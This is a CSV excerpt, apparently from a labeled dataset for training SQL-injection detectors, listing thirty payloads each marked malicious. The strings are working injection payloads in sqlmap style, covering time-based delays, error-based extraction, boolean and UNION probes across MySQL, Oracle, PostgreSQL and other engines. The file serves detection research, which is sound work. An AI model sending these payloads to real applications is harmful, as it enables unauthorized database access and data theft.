row_index,payload_norm,label,sqli_type_hint
4800,1'|| ( select 'zxla' from dual where 7634 = 7634 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) ||',1,
4801,"1"" ) where 3390 = 3390",1,
4802,"1' ) as sjmt where 6541 = 6541 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
4803,"select sleep ( 5 ) and ( ( ( ""lczw"" = ""lczw",1,
4804,1' in boolean mode ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) #,1,
4805,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) # ewsz,1,
4806,1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'fbzo' like 'fbzo,1,
4807,"1' ) union all select null,null,null,null,null,null,null,null,null,null--",1,
4808,"-3270%' or elt ( 9404 = 3498,3498 ) and '%' = '",1,
4809,"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""ygzq"" like ""ygzq",1,
4810,"-6534%' ) ) or make_set ( 4107 = 9457,9457 ) and ( ( '%' = '",1,
4811,"1 ) as qodq where 4945 = 4945 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
4812,"1'|| ( select 'uyfo' where 1236 = 1236 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",1,
4813,"-2241 ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 6840 = 6840",1,
4814,"1 ) where 8302 = 8302 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1,
4815,1%' ) ) ),1,
4816,"1 ) ) as mmby where 3990 = 3990 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
4817,"-4586' ) as shdb where 6176 = 6176 union all select 6176,6176,6176,6176#",1,
4818,1'+ ( select lqhd where 4251 = 4251 and ( 8754 = 5779 ) *5779 ) +',1,
4819,-2717' ) ) ) or 8571 = 8571--,1,
4820,"1 ) ) union all select null,null,null,null,null--",1,
4821,"1%"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""%"" = """,1,
4822,1%' ),1,
4823,"-5698' ) ) as egjr where 5586 = 5586 union all select 5586,5586,5586--",1,
4824,"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1,
4825,1'|| ( select 'sbip' from dual where 7302 = 7302 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) ||',1,
4826,1'|| ( select 'bwqc' from dual where 6897 = 6897 and sleep ( 5 ) #,1,
4827,1' ) ) as hzbj where 1725 = 1725 or sleep ( 5 ) #,1,
4828,"-2979' ) ) as klou where 7092 = 7092 union all select 7092,7092--",1,
4829,"1' ) union all select null,null#",1,
